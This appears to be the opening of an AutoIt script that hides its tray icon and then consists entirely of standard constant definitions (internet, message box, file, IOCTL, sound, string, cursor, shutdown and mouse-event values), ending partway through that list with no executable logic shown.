#NoTrayIcon
Opt("TrayAutoPause", 0)
Global Const $inet_localcache = 0
Global Const $inet_forcereload = 1
Global Const $inet_ignoressl = 2
Global Const $inet_asciitransfer = 4
Global Const $inet_binarytransfer = 8
Global Const $inet_forcebypass = 16
Global Const $inet_downloadwait = 0
Global Const $inet_downloadbackground = 1
Global Const $inet_downloadread = 0
Global Const $inet_downloadsize = 1
Global Const $inet_downloadcomplete = 2
Global Const $inet_downloadsuccess = 3
Global Const $inet_downloaderror = 4
Global Const $inet_downloadextended = 5
Global Const $mb_ok = 0
Global Const $mb_okcancel = 1
Global Const $mb_abortretryignore = 2
Global Const $mb_yesnocancel = 3
Global Const $mb_yesno = 4
Global Const $mb_retrycancel = 5
Global Const $mb_canceltrycontinue = 6
Global Const $mb_help = 16384
Global Const $mb_iconstop = 16
Global Const $mb_iconerror = 16
Global Const $mb_iconhand = 16
Global Const $mb_iconquestion = 32
Global Const $mb_iconexclamation = 48
Global Const $mb_iconwarning = 48
Global Const $mb_iconinformation = 64
Global Const $mb_iconasterisk = 64
Global Const $mb_usericon = 128
Global Const $mb_defbutton1 = 0
Global Const $mb_defbutton2 = 256
Global Const $mb_defbutton3 = 512
Global Const $mb_defbutton4 = 768
Global Const $mb_applmodal = 0
Global Const $mb_systemmodal = 4096
Global Const $mb_taskmodal = 8192
Global Const $mb_default_desktop_only = 131072
Global Const $mb_right = 524288
Global Const $mb_rtlreading = 1048576
Global Const $mb_setforeground = 65536
Global Const $mb_topmost = 262144
Global Const $mb_service_notification = 2097152
Global Const $mb_rightjustified = $mb_right
Global Const $idtimeout = -1
Global Const $idok = 1
Global Const $idcancel = 2
Global Const $idabort = 3
Global Const $idretry = 4
Global Const $idignore = 5
Global Const $idyes = 6
Global Const $idno = 7
Global Const $idclose = 8
Global Const $idhelp = 9
Global Const $idtryagain = 10
Global Const $idcontinue = 11
Global Const $backup_alternate_data = 4
Global Const $backup_data = 1
Global Const $backup_ea_data = 2
Global Const $backup_link = 5
Global Const $backup_object_id = 7
Global Const $backup_property_data = 6
Global Const $backup_reparse_data = 8
Global Const $backup_security_data = 3
Global Const $backup_sparse_block = 9
Global Const $backup_txfs_data = 10
Global Const $copy_file_allow_decrypted_destination = 8
Global Const $copy_file_copy_symlink = 2048
Global Const $copy_file_fail_if_exists = 1
Global Const $copy_file_no_buffering = 4096
Global Const $copy_file_open_source_for_write = 4
Global Const $copy_file_restartable = 2
Global Const $move_file_copy_allowed = 2
Global Const $move_file_create_hardlink = 16
Global Const $move_file_delay_until_reboot = 4
Global Const $move_file_fail_if_not_trackable = 32
Global Const $move_file_replace_existing = 1
Global Const $move_file_write_through = 8
Global Const $progress_continue = 0
Global Const $progress_cancel = 1
Global Const $progress_stop = 2
Global Const $progress_quiet = 3
Global Const $file_append_data = 4
Global Const $file_delete_child = 64
Global Const $file_execute = 32
Global Const $file_read_attributes = 128
Global Const $file_read_data = 1
Global Const $file_read_ea = 8
Global Const $file_write_attributes = 256
Global Const $file_write_data = 2
Global Const $file_write_ea = 16
Global Const $file_add_file = $file_write_data
Global Const $file_add_subdirectory = $file_append_data
Global Const $file_create_pipe_instance = $file_append_data
Global Const $file_list_directory = $file_read_data
Global Const $file_traverse = $file_execute
Global Const $file_all_access = 2032127
Global Const $file_flag_backup_semantics = 33554432
Global Const $file_flag_delete_on_close = 67108864
Global Const $file_flag_no_buffering = 536870912
Global Const $file_flag_open_no_recall = 1048576
Global Const $file_flag_open_reparse_point = 2097152
Global Const $file_flag_overlapped = 1073741824
Global Const $file_flag_posix_semantics = 1048576
Global Const $file_flag_random_access = 268435456
Global Const $file_flag_sequential_scan = 134217728
Global Const $file_flag_write_through = -2147483648
Global Const $security_anonymous = 0
Global Const $security_context_tracking = 262144
Global Const $security_delegation = 196608
Global Const $security_effective_only = 524288
Global Const $security_identification = 65536
Global Const $security_impersonation = 131072
Global Const $sec_commit = 134217728
Global Const $sec_image = 16777216
Global Const $sec_large_pages = -2147483648
Global Const $sec_nocache = 268435456
Global Const $sec_reserve = 67108864
Global Const $sec_writecombine = 1073741824
Global Const $section_extend_size = 16
Global Const $section_map_execute = 8
Global Const $section_map_read = 4
Global Const $section_map_write = 2
Global Const $section_query = 1
Global Const $section_all_access = 2031647
Global Const $file_map_copy = 1
Global Const $file_map_execute = 32
Global Const $file_map_read = 4
Global Const $file_map_write = 2
Global Const $file_map_all_access = $section_all_access
Global Const $ddd_exact_match_on_remove = 4
Global Const $ddd_no_broadcast_system = 8
Global Const $ddd_raw_target_path = 1
Global Const $ddd_remove_definition = 2
Global Const $fsctl_allow_extended_dasd_io = 589955
Global Const $fsctl_create_or_get_object_id = 590016
Global Const $fsctl_create_usn_journal = 590055
Global Const $fsctl_delete_object_id = 589984
Global Const $fsctl_delete_reparse_point = 589996
Global Const $fsctl_delete_usn_journal = 590072
Global Const $fsctl_dismount_volume = 589856
Global Const $fsctl_dump_property_data = 589975
Global Const $fsctl_enable_upgrade = 622800
Global Const $fsctl_encryption_fsctl_io = 590043
Global Const $fsctl_enum_usn_data = 590003
Global Const $fsctl_extend_volume = 590064
Global Const $fsctl_filesystem_get_statistics = 589920
Global Const $fsctl_find_files_by_sid = 589967
Global Const $fsctl_get_compression = 589884
Global Const $fsctl_get_ntfs_file_record = 589928
Global Const $fsctl_get_ntfs_volume_data = 589924
Global Const $fsctl_get_object_id = 589980
Global Const $fsctl_get_reparse_point = 589992
Global Const $fsctl_get_retrieval_pointers = 589939
Global Const $fsctl_get_volume_bitmap = 589935
Global Const $fsctl_hsm_data = 639251
Global Const $fsctl_hsm_msg = 639240
Global Const $fsctl_invalidate_volumes = 589908
Global Const $fsctl_is_pathname_valid = 589868
Global Const $fsctl_is_volume_dirty = 589944
Global Const $fsctl_is_volume_mounted = 589864
Global Const $fsctl_lock_volume = 589848
Global Const $fsctl_mark_as_system_hive = 589903
Global Const $fsctl_mark_handle = 590076
Global Const $fsctl_mark_volume_dirty = 589872
Global Const $fsctl_move_file = 589940
Global Const $fsctl_opbatch_ack_close_pending = 589840
Global Const $fsctl_oplock_break_ack_no_2 = 589904
Global Const $fsctl_oplock_break_acknowledge = 589836
Global Const $fsctl_oplock_break_notify = 589844
Global Const $fsctl_query_allocated_ranges = 606415
Global Const $fsctl_query_fat_bpb = 589912
Global Const $fsctl_query_retrieval_pointers = 589883
Global Const $fsctl_query_usn_journal = 590068
Global Const $fsctl_read_file_usn_data = 590059
Global Const $fsctl_read_property_data = 589959
Global Const $fsctl_read_raw_encrypted = 590051
Global Const $fsctl_read_usn_journal = 590011
Global Const $fsctl_recall_file = 590103
Global Const $fsctl_request_batch_oplock = 589832
Global Const $fsctl_request_filter_oplock = 589916
Global Const $fsctl_request_oplock_level_1 = 589824
Global Const $fsctl_request_oplock_level_2 = 589828
Global Const $fsctl_security_id_check = 606391
Global Const $fsctl_set_compression = 639040
Global Const $fsctl_set_encryption = 590039
Global Const $fsctl_set_object_id = 589976
Global Const $fsctl_set_object_id_extended = 590012
Global Const $fsctl_set_reparse_point = 589988
Global Const $fsctl_set_sparse = 590020
Global Const $fsctl_set_zero_data = 622792
Global Const $fsctl_sis_copyfile = 590080
Global Const $fsctl_sis_link_files = 639236
Global Const $fsctl_unlock_volume = 589852
Global Const $fsctl_write_property_data = 589963
Global Const $fsctl_write_raw_encrypted = 590047
Global Const $fsctl_write_usn_close_record = 590063
Global Const $ioctl_aacs_end_session = 3363020
Global Const $ioctl_aacs_generate_binding_nonce = 3395824
Global Const $ioctl_aacs_get_certificate = 3363028
Global Const $ioctl_aacs_get_challenge_key = 3363032
Global Const $ioctl_aacs_read_binding_nonce = 3363052
Global Const $ioctl_aacs_read_media_id = 3363048
Global Const $ioctl_aacs_read_media_key_block = 3363012
Global Const $ioctl_aacs_read_media_key_block_size = 3363008
Global Const $ioctl_aacs_read_serial_number = 3363044
Global Const $ioctl_aacs_read_volume_id = 3363040
Global Const $ioctl_aacs_send_certificate = 3363024
Global Const $ioctl_aacs_send_challenge_key = 3363036
Global Const $ioctl_aacs_start_session = 3363016
Global Const $ioctl_ata_pass_through = 315436
Global Const $ioctl_ata_pass_through_direct = 315440
Global Const $ioctl_cdrom_check_verify = 149504
Global Const $ioctl_cdrom_disk_type = 131136
Global Const $ioctl_cdrom_eject_media = 149512
Global Const $ioctl_cdrom_find_new_devices = 149528
Global Const $ioctl_cdrom_get_configuration = 147544
Global Const $ioctl_cdrom_get_control = 147508
Global Const $ioctl_cdrom_get_drive_geometry = 147532
Global Const $ioctl_cdrom_get_drive_geometry_ex = 147536
Global Const $ioctl_cdrom_get_last_session = 147512
Global Const $ioctl_cdrom_get_volume = 147476
Global Const $ioctl_cdrom_load_media = 149516
Global Const $ioctl_cdrom_media_removal = 149508
Global Const $ioctl_cdrom_pause_audio = 147468
Global Const $ioctl_cdrom_play_audio_msf = 147480
Global Const $ioctl_cdrom_raw_read = 147518
Global Const $ioctl_cdrom_read_q_channel = 147500
Global Const $ioctl_cdrom_read_toc = 147456
Global Const $ioctl_cdrom_read_toc_ex = 147540
Global Const $ioctl_cdrom_release = 149524
Global Const $ioctl_cdrom_reserve = 149520
Global Const $ioctl_cdrom_resume_audio = 147472
Global Const $ioctl_cdrom_seek_audio_msf = 147460
Global Const $ioctl_cdrom_set_volume = 147496
Global Const $ioctl_cdrom_stop_audio = 147464
Global Const $ioctl_cdrom_unload_driver = 151560
Global Const $ioctl_disk_check_verify = 477184
Global Const $ioctl_disk_controller_number = 458820
Global Const $ioctl_disk_create_disk = 507992
Global Const $ioctl_disk_delete_drive_layout = 508160
Global Const $ioctl_disk_eject_media = 477192
Global Const $ioctl_disk_find_new_devices = 477208
Global Const $ioctl_disk_format_tracks = 507928
Global Const $ioctl_disk_format_tracks_ex = 507948
Global Const $ioctl_disk_get_cache_information = 475348
Global Const $ioctl_disk_get_drive_geometry = 458752
Global Const $ioctl_disk_get_drive_geometry_ex = 458912
Global Const $ioctl_disk_get_drive_layout = 475148
Global Const $ioctl_disk_get_drive_layout_ex = 458832
Global Const $ioctl_disk_get_length_info = 475228
Global Const $ioctl_disk_get_media_types = 461824
Global Const $ioctl_disk_get_partition_info = 475140
Global Const $ioctl_disk_get_partition_info_ex = 458824
Global Const $ioctl_disk_get_write_cache_state = 475356
Global Const $ioctl_disk_grow_partition = 508112
Global Const $ioctl_disk_histogram_data = 458804
Global Const $ioctl_disk_histogram_reset = 458808
Global Const $ioctl_disk_histogram_structure = 458800
Global Const $ioctl_disk_internal_clear_verify = 459783
Global Const $ioctl_disk_internal_set_notify = 459784
Global Const $ioctl_disk_internal_set_verify = 459779
Global Const $ioctl_disk_is_writable = 458788
Global Const $ioctl_disk_load_media = 477196
Global Const $ioctl_disk_logging = 458792
Global Const $ioctl_disk_media_removal = 477188
Global Const $ioctl_disk_performance = 458784
Global Const $ioctl_disk_performance_off = 458848
Global Const $ioctl_disk_reassign_blocks = 507932
Global Const $ioctl_disk_release = 477204
Global Const $ioctl_disk_request_data = 458816
Global Const $ioctl_disk_request_structure = 458812
Global Const $ioctl_disk_reserve = 477200
Global Const $ioctl_disk_set_cache_information = 508120
Global Const $ioctl_disk_set_drive_layout = 507920
Global Const $ioctl_disk_set_drive_layout_ex = 507988
Global Const $ioctl_disk_set_partition_info = 507912
Global Const $ioctl_disk_set_partition_info_ex = 507980
Global Const $ioctl_disk_update_drive_size = 508104
Global Const $ioctl_disk_update_properties = 459072
Global Const $ioctl_disk_verify = 458772
Global Const $ioctl_dvd_end_session = 3362828
Global Const $ioctl_dvd_get_region = 3362836
Global Const $ioctl_dvd_read_key = 3362820
Global Const $ioctl_dvd_read_structure = 3363136
Global Const $ioctl_dvd_send_key = 3362824
Global Const $ioctl_dvd_send_key2 = 3395608
Global Const $ioctl_dvd_set_read_ahead = 3362832
Global Const $ioctl_dvd_start_session = 3362816
Global Const $ioctl_mountdev_link_created = 5046288
Global Const $ioctl_mountdev_link_deleted = 5046292
Global Const $ioctl_mountdev_query_stable_guid = 5046296
Global Const $ioctl_mountdev_query_suggested_link_name = 5046284
Global Const $ioctl_mountdev_query_unique_id = 5046272
Global Const $ioctl_mountdev_unique_id_change_notify = 5046276
Global Const $ioctl_mountmgr_auto_dl_assignments = 7192596
Global Const $ioctl_mountmgr_change_notify = 7159840
Global Const $ioctl_mountmgr_check_unprocessed_volumes = 7159848
Global Const $ioctl_mountmgr_create_point = 7192576
Global Const $ioctl_mountmgr_delete_points = 7192580
Global Const $ioctl_mountmgr_delete_points_dbonly = 7192588
Global Const $ioctl_mountmgr_keep_links_when_offline = 7192612
Global Const $ioctl_mountmgr_next_drive_letter = 7192592
Global Const $ioctl_mountmgr_query_dos_volume_path = 7143472
Global Const $ioctl_mountmgr_query_dos_volume_paths = 7143476
Global Const $ioctl_mountmgr_query_points = 7143432
Global Const $ioctl_mountmgr_volume_arrival_notification = 7159852
Global Const $ioctl_mountmgr_volume_mount_point_created = 7192600
Global Const $ioctl_mountmgr_volume_mount_point_deleted = 7192604
Global Const $ioctl_scsi_get_inquiry_data = 266252
Global Const $ioctl_scsi_get_capabilities = 266256
Global Const $ioctl_scsi_get_address = 266264
Global Const $ioctl_scsi_miniport = 315400
Global Const $ioctl_scsi_pass_through = 315396
Global Const $ioctl_scsi_pass_through_direct = 315412
Global Const $ioctl_scsi_rescan_bus = 266268
Global Const $ioctl_storage_break_reservation = 2969620
Global Const $ioctl_storage_check_verify = 2967552
Global Const $ioctl_storage_check_verify2 = 2951168
Global Const $ioctl_storage_eject_media = 2967560
Global Const $ioctl_storage_ejection_control = 2951488
Global Const $ioctl_storage_find_new_devices = 2967576
Global Const $ioctl_storage_get_device_number = 2953344
Global Const $ioctl_storage_get_hotplug_info = 2952212
Global Const $ioctl_storage_get_media_serial_number = 2952208
Global Const $ioctl_storage_get_media_types = 2952192
Global Const $ioctl_storage_get_media_types_ex = 2952196
Global Const $ioctl_storage_load_media = 2967564
Global Const $ioctl_storage_load_media2 = 2951180
Global Const $ioctl_storage_manage_data_set_attributes = 2987012
Global Const $ioctl_storage_mcn_control = 2951492
Global Const $ioctl_storage_media_removal = 2967556
Global Const $ioctl_storage_persistent_reserve_in = 2969624
Global Const $ioctl_storage_persistent_reserve_out = 2969628
Global Const $ioctl_storage_predict_failure = 2953472
Global Const $ioctl_storage_query_property = 2954240
Global Const $ioctl_storage_release = 2967572
Global Const $ioctl_storage_reserve = 2967568
Global Const $ioctl_storage_reset_bus = 2969600
Global Const $ioctl_storage_reset_device = 2969604
Global Const $ioctl_storage_set_hotplug_info = 3001368
Global Const $ioctl_storage_set_read_ahead = 2966528
Global Const $ioctl_volume_get_gpt_attributes = 5636152
Global Const $ioctl_volume_get_volume_disk_extents = 5636096
Global Const $ioctl_volume_is_clustered = 5636144
Global Const $ioctl_volume_is_io_capable = 5636116
Global Const $ioctl_volume_is_offline = 5636112
Global Const $ioctl_volume_is_partition = 5636136
Global Const $ioctl_volume_logical_to_physical = 5636128
Global Const $ioctl_volume_offline = 5685260
Global Const $ioctl_volume_online = 5685256
Global Const $ioctl_volume_physical_to_logical = 5636132
Global Const $ioctl_volume_query_failover_set = 5636120
Global Const $ioctl_volume_query_volume_number = 5636124
Global Const $ioctl_volume_read_plex = 5652526
Global Const $ioctl_volume_set_gpt_attributes = 5636148
Global Const $ioctl_volume_supports_online_offline = 5636100
Global Const $smart_get_version = 475264
Global Const $smart_rcv_drive_data = 508040
Global Const $smart_send_drive_command = 508036
Global Const $file_encryptable = 0
Global Const $file_is_encrypted = 1
Global Const $file_read_only = 8
Global Const $file_root_dir = 3
Global Const $file_system_attr = 2
Global Const $file_system_dir = 4
Global Const $file_system_not_support = 6
Global Const $file_unknown = 5
Global Const $file_user_disallowed = 7
Global Const $scs_32bit_binary = 0
Global Const $scs_64bit_binary = 6
Global Const $scs_dos_binary = 1
Global Const $scs_os216_binary = 5
Global Const $scs_pif_binary = 3
Global Const $scs_posix_binary = 4
Global Const $scs_wow_binary = 2
Global Const $drive_bus_type_unknown = 0
Global Const $drive_bus_type_scsi = 1
Global Const $drive_bus_type_atapi = 2
Global Const $drive_bus_type_ata = 3
Global Const $drive_bus_type_1394 = 4
Global Const $drive_bus_type_ssa = 5
Global Const $drive_bus_type_fibre = 6
Global Const $drive_bus_type_usb = 7
Global Const $drive_bus_type_raid = 8
Global Const $drive_bus_type_iscsi = 9
Global Const $drive_bus_type_sas = 10
Global Const $drive_bus_type_sata = 11
Global Const $drive_bus_type_sd = 12
Global Const $drive_bus_type_mmc = 13
Global Const $drive_unknown = 0
Global Const $drive_no_root_dir = 1
Global Const $drive_removable = 2
Global Const $drive_fixed = 3
Global Const $drive_remote = 4
Global Const $drive_cdrom = 5
Global Const $drive_ramdisk = 6
Global Const $file_type_char = 2
Global Const $file_type_disk = 1
Global Const $file_type_pipe = 3
Global Const $file_type_remote = 32768
Global Const $file_type_unknown = 0
Global Const $file_name_normalized = 0
Global Const $file_name_opened = 8
Global Const $volume_name_dos = 0
Global Const $volume_name_guid = 1
Global Const $volume_name_none = 4
Global Const $volume_name_nt = 2
Global Const $image_file_machine_unknown = 0
Global Const $image_file_machine_am33 = 467
Global Const $image_file_machine_amd64 = 34404
Global Const $image_file_machine_arm = 448
Global Const $image_file_machine_ebc = 3772
Global Const $image_file_machine_i386 = 332
Global Const $image_file_machine_ia64 = 512
Global Const $image_file_machine_m32r = 36929
Global Const $image_file_machine_mips16 = 614
Global Const $image_file_machine_mipsfpu = 870
Global Const $image_file_machine_mipsfpu16 = 1126
Global Const $image_file_machine_powerpc = 496
Global Const $image_file_machine_powerpcfp = 497
Global Const $image_file_machine_r4000 = 358
Global Const $image_file_machine_sh3 = 418
Global Const $image_file_machine_sh3dsp = 419
Global Const $image_file_machine_sh4 = 422
Global Const $image_file_machine_sh5 = 424
Global Const $image_file_machine_thumb = 450
Global Const $image_file_machine_wcemipsv2 = 361
Global Const $file_case_preserved_names = 2
Global Const $file_case_sensitive_search = 1
Global Const $file_file_compression = 16
Global Const $file_named_streams = 262144
Global Const $file_persistent_acls = 8
Global Const $file_read_only_volume = 524288
Global Const $file_sequential_write_once = 1048576
Global Const $file_supports_encryption = 131072
Global Const $file_supports_extended_attributes = 8388608
Global Const $file_supports_hard_links = 4194304
Global Const $file_supports_object_ids = 65536
Global Const $file_supports_open_by_file_id = 16777216
Global Const $file_supports_reparse_points = 128
Global Const $file_supports_sparse_files = 64
Global Const $file_supports_transactions = 2097152
Global Const $file_supports_usn_journal = 33554432
Global Const $file_unicode_on_disk = 4
Global Const $file_volume_is_compressed = 32768
Global Const $file_volume_quotas = 32
Global Const $file_device_8042_port = 39
Global Const $file_device_acpi = 50
Global Const $file_device_battery = 41
Global Const $file_device_beep = 1
Global Const $file_device_bus_extender = 42
Global Const $file_device_cd_rom = 2
Global Const $file_device_cd_rom_file_system = 3
Global Const $file_device_changer = 48
Global Const $file_device_controller = 4
Global Const $file_device_datalink = 5
Global Const $file_device_dfs = 6
Global Const $file_device_dfs_file_system = 53
Global Const $file_device_dfs_volume = 54
Global Const $file_device_disk = 7
Global Const $file_device_disk_file_system = 8
Global Const $file_device_dvd = 51
Global Const $file_device_file_system = 9
Global Const $file_device_fips = 58
Global Const $file_device_fullscreen_video = 52
Global Const $file_device_inport_port = 10
Global Const $file_device_keyboard = 11
Global Const $file_device_ks = 47
Global Const $file_device_ksec = 57
Global Const $file_device_mailslot = 12
Global Const $file_device_mass_storage = 45
Global Const $file_device_midi_in = 13
Global Const $file_device_midi_out = 14
Global Const $file_device_modem = 43
Global Const $file_device_mouse = 15
Global Const $file_device_multi_unc_provider = 16
Global Const $file_device_named_pipe = 17
Global Const $file_device_network = 18
Global Const $file_device_network_browser = 19
Global Const $file_device_network_file_system = 20
Global Const $file_device_network_redirector = 40
Global Const $file_device_null = 21
Global Const $file_device_parallel_port = 22
Global Const $file_device_physical_netcard = 23
Global Const $file_device_printer = 24
Global Const $file_device_scanner = 25
Global Const $file_device_screen = 28
Global Const $file_device_serenum = 55
Global Const $file_device_serial_mouse_port = 26
Global Const $file_device_serial_port = 27
Global Const $file_device_smartcard = 49
Global Const $file_device_smb = 46
Global Const $file_device_sound = 29
Global Const $file_device_streams = 30
Global Const $file_device_tape = 31
Global Const $file_device_tape_file_system = 32
Global Const $file_device_termsrv = 56
Global Const $file_device_transport = 33
Global Const $file_device_unknown = 34
Global Const $file_device_vdm = 44
Global Const $file_device_video = 35
Global Const $file_device_virtual_disk = 36
Global Const $file_device_wave_in = 37
Global Const $file_device_wave_out = 38
Global Const $file_any_access = 0
Global Const $file_special_access = $file_any_access
Global Const $file_read_access = 1
Global Const $file_write_access = 2
Global Const $method_buffered = 0
Global Const $method_in_direct = 1
Global Const $method_out_direct = 2
Global Const $method_neither = 3
Global Const $file_notify_change_file_name = 1
Global Const $file_notify_change_dir_name = 2
Global Const $file_notify_change_attributes = 4
Global Const $file_notify_change_size = 8
Global Const $file_notify_change_last_write = 16
Global Const $file_notify_change_last_access = 32
Global Const $file_notify_change_creation = 64
Global Const $file_notify_change_security = 256
Global Const $file_action_added = 1
Global Const $file_action_removed = 2
Global Const $file_action_modified = 3
Global Const $file_action_renamed_old_name = 4
Global Const $file_action_renamed_new_name = 5
Global Const $replacefile_write_through = 1
Global Const $replacefile_ignore_merge_errors = 2
Global Const $replacefile_ignore_acl_errors = 4
Global Const $base_search_path_enable_safe_searchmode = 1
Global Const $base_search_path_disable_safe_searchmode = 65536
Global Const $base_search_path_permanent = 32768
Global Const $fc_nooverwrite = 0
Global Const $fc_overwrite = 1
Global Const $fc_createpath = 8
Global Const $ft_modified = 0
Global Const $ft_created = 1
Global Const $ft_accessed = 2
Global Const $ft_array = 0
Global Const $ft_string = 1
Global Const $fsf_createbutton = 1
Global Const $fsf_newdialog = 2
Global Const $fsf_editcontrol = 4
Global Const $ft_nonrecursive = 0
Global Const $ft_recursive = 1
Global Const $fo_read = 0
Global Const $fo_append = 1
Global Const $fo_overwrite = 2
Global Const $fo_createpath = 8
Global Const $fo_binary = 16
Global Const $fo_unicode = 32
Global Const $fo_utf16_le = 32
Global Const $fo_utf16_be = 64
Global Const $fo_utf8 = 128
Global Const $fo_utf8_nobom = 256
Global Const $fo_ansi = 512
Global Const $fo_utf16_le_nobom = 1024
Global Const $fo_utf16_be_nobom = 2048
Global Const $fo_utf8_full = 16384
Global Const $fo_fullfile_detect = 16384
Global Const $eof = -1
Global Const $fd_filemustexist = 1
Global Const $fd_pathmustexist = 2
Global Const $fd_multiselect = 4
Global Const $fd_promptcreatenew = 8
Global Const $fd_promptoverwrite = 16
Global Const $create_new = 1
Global Const $create_always = 2
Global Const $open_existing = 3
Global Const $open_always = 4
Global Const $truncate_existing = 5
Global Const $invalid_set_file_pointer = -1
Global Const $file_begin = 0
Global Const $file_current = 1
Global Const $file_end = 2
Global Const $file_attribute_readonly = 1
Global Const $file_attribute_hidden = 2
Global Const $file_attribute_system = 4
Global Const $file_attribute_directory = 16
Global Const $file_attribute_archive = 32
Global Const $file_attribute_device = 64
Global Const $file_attribute_normal = 128
Global Const $file_attribute_temporary = 256
Global Const $file_attribute_sparse_file = 512
Global Const $file_attribute_reparse_point = 1024
Global Const $file_attribute_compressed = 2048
Global Const $file_attribute_offline = 4096
Global Const $file_attribute_not_content_indexed = 8192
Global Const $file_attribute_encrypted = 16384
Global Const $file_share_read = 1
Global Const $file_share_write = 2
Global Const $file_share_delete = 4
Global Const $file_share_readwrite = BitOR($file_share_read, $file_share_write)
Global Const $file_share_any = BitOR($file_share_read, $file_share_write, $file_share_delete)
Global Const $generic_all = 268435456
Global Const $generic_execute = 536870912
Global Const $generic_write = 1073741824
Global Const $generic_read = -2147483648
Global Const $generic_readwrite = BitOR($generic_read, $generic_write)
Global Const $file_encoding_utf16le = 32
Global Const $fe_entire_utf8 = 1
Global Const $fe_partialfirst_utf8 = 2
Global Const $fn_fullpath = 0
Global Const $fn_relativepath = 1
Global Const $fv_comments = "Comments"
Global Const $fv_companyname = "CompanyName"
Global Const $fv_filedescription = "FileDescription"
Global Const $fv_fileversion = "FileVersion"
Global Const $fv_internalname = "InternalName"
Global Const $fv_legalcopyright = "LegalCopyright"
Global Const $fv_legaltrademarks = "LegalTrademarks"
Global Const $fv_originalfilename = "OriginalFilename"
Global Const $fv_productname = "ProductName"
Global Const $fv_productversion = "ProductVersion"
Global Const $fv_privatebuild = "PrivateBuild"
Global Const $fv_specialbuild = "SpecialBuild"
Global Const $frta_nocount = 0
Global Const $frta_count = 1
Global Const $frta_intarrays = 2
Global Const $frta_entiresplit = 4
Global Const $flta_filesfolders = 0
Global Const $flta_files = 1
Global Const $flta_folders = 2
Global Const $fltar_filesfolders = 0
Global Const $fltar_files = 1
Global Const $fltar_folders = 2
Global Const $fltar_nohidden = 4
Global Const $fltar_nosystem = 8
Global Const $fltar_nolink = 16
Global Const $fltar_norecur = 0
Global Const $fltar_recur = 1
Global Const $fltar_nosort = 0
Global Const $fltar_sort = 1
Global Const $fltar_fastsort = 2
Global Const $fltar_nopath = 0
Global Const $fltar_relpath = 1
Global Const $fltar_fullpath = 2
Global Const $snd_application = 128
Global Const $snd_alias = 65536
Global Const $snd_alias_id = 1114112
Global Const $snd_async = 1
Global Const $snd_filename = 131072
Global Const $snd_loop = 8
Global Const $snd_memory = 4
Global Const $snd_nodefault = 2
Global Const $snd_nostop = 16
Global Const $snd_nowait = 8192
Global Const $snd_purge = 64
Global Const $snd_resource = 262148
Global Const $snd_sentry = 524288
Global Const $snd_sync = 0
Global Const $snd_system = 2097152
Global Const $snd_system_nostop = 2097168
Global Const $snd_alias_systemasterisk = "SystemAsterisk"
Global Const $snd_alias_systemdefault = "SystemDefault"
Global Const $snd_alias_systemexclamation = "SystemExclamation"
Global Const $snd_alias_systemexit = "SystemExit"
Global Const $snd_alias_systemhand = "SystemHand"
Global Const $snd_alias_systemquestion = "SystemQuestion"
Global Const $snd_alias_systemstart = "SystemStart"
Global Const $snd_alias_systemwelcome = "SystemWelcome"
Global Const $str_nocasesense = 0
Global Const $str_casesense = 1
Global Const $str_nocasesensebasic = 2
Global Const $str_stripleading = 1
Global Const $str_striptrailing = 2
Global Const $str_stripspaces = 4
Global Const $str_stripall = 8
Global Const $str_chrsplit = 0
Global Const $str_entiresplit = 1
Global Const $str_nocount = 2
Global Const $str_regexpmatch = 0
Global Const $str_regexparraymatch = 1
Global Const $str_regexparrayfullmatch = 2
Global Const $str_regexparrayglobalmatch = 3
Global Const $str_regexparrayglobalfullmatch = 4
Global Const $str_endisstart = 0
Global Const $str_endnotstart = 1
Global Const $sb_ansi = 1
Global Const $sb_utf16le = 2
Global Const $sb_utf16be = 3
Global Const $sb_utf8 = 4
Global Const $se_utf16 = 0
Global Const $se_ansi = 1
Global Const $se_utf8 = 2
Global Const $str_utf16 = 0
Global Const $str_ucs2 = 1
Global Const $opt_coordsrelative = 0
Global Const $opt_coordsabsolute = 1
Global Const $opt_coordsclient = 2
Global Const $opt_errorsilent = 0
Global Const $opt_errorfatal = 1
Global Const $opt_capsnostore = 0
Global Const $opt_capsstore = 1
Global Const $opt_matchstart = 1
Global Const $opt_matchany = 2
Global Const $opt_matchexact = 3
Global Const $opt_matchadvanced = 4
Global Const $ccs_top = 1
Global Const $ccs_nomovey = 2
Global Const $ccs_bottom = 3
Global Const $ccs_noresize = 4
Global Const $ccs_noparentalign = 8
Global Const $ccs_nohilite = 16
Global Const $ccs_adjustable = 32
Global Const $ccs_nodivider = 64
Global Const $ccs_vert = 128
Global Const $ccs_left = 129
Global Const $ccs_nomovex = 130
Global Const $ccs_right = 131
Global Const $dt_drivetype = 1
Global Const $dt_ssdstatus = 2
Global Const $dt_bustype = 3
Global Const $proxy_ie = 0
Global Const $proxy_none = 1
Global Const $proxy_specified = 2
Global Const $objid_window = 0
Global Const $objid_titlebar = -2
Global Const $objid_sizegrip = -7
Global Const $objid_caret = -8
Global Const $objid_cursor = -9
Global Const $objid_alert = -10
Global Const $objid_sound = -11
Global Const $dlg_centerontop = 0
Global Const $dlg_notitle = 1
Global Const $dlg_notontop = 2
Global Const $dlg_textleft = 4
Global Const $dlg_textright = 8
Global Const $dlg_moveable = 16
Global Const $dlg_textvcenter = 32
Global Const $idc_unknown = 0
Global Const $idc_appstarting = 1
Global Const $idc_arrow = 2
Global Const $idc_cross = 3
Global Const $idc_hand = 32649
Global Const $idc_help = 4
Global Const $idc_ibeam = 5
Global Const $idc_icon = 6
Global Const $idc_no = 7
Global Const $idc_size = 8
Global Const $idc_sizeall = 9
Global Const $idc_sizenesw = 10
Global Const $idc_sizens = 11
Global Const $idc_sizenwse = 12
Global Const $idc_sizewe = 13
Global Const $idc_uparrow = 14
Global Const $idc_wait = 15
Global Const $idi_application = 32512
Global Const $idi_asterisk = 32516
Global Const $idi_exclamation = 32515
Global Const $idi_hand = 32513
Global Const $idi_question = 32514
Global Const $idi_winlogo = 32517
Global Const $idi_shield = 32518
Global Const $idi_error = $idi_hand
Global Const $idi_information = $idi_asterisk
Global Const $idi_warning = $idi_exclamation
Global Const $sd_logoff = 0
Global Const $sd_shutdown = 1
Global Const $sd_reboot = 2
Global Const $sd_force = 4
Global Const $sd_powerdown = 8
Global Const $sd_forcehung = 16
Global Const $sd_standby = 32
Global Const $sd_hibernate = 64
Global Const $stdin_child = 1
Global Const $stdout_child = 2
Global Const $stderr_child = 4
Global Const $stderr_merged = 8
Global Const $stdio_inherit_parent = 16
Global Const $run_create_new_console = 65536
Global Const $ubound_dimensions = 0
Global Const $ubound_rows = 1
Global Const $ubound_columns = 2
Global Const $mouseeventf_absolute = 32768
Global Const $mouseeventf_move = 1
Global Const $mouseeventf_leftdown = 2
Global Const $mouseeventf_leftup = 4
Global Const $mouseeventf_rightdown = 8
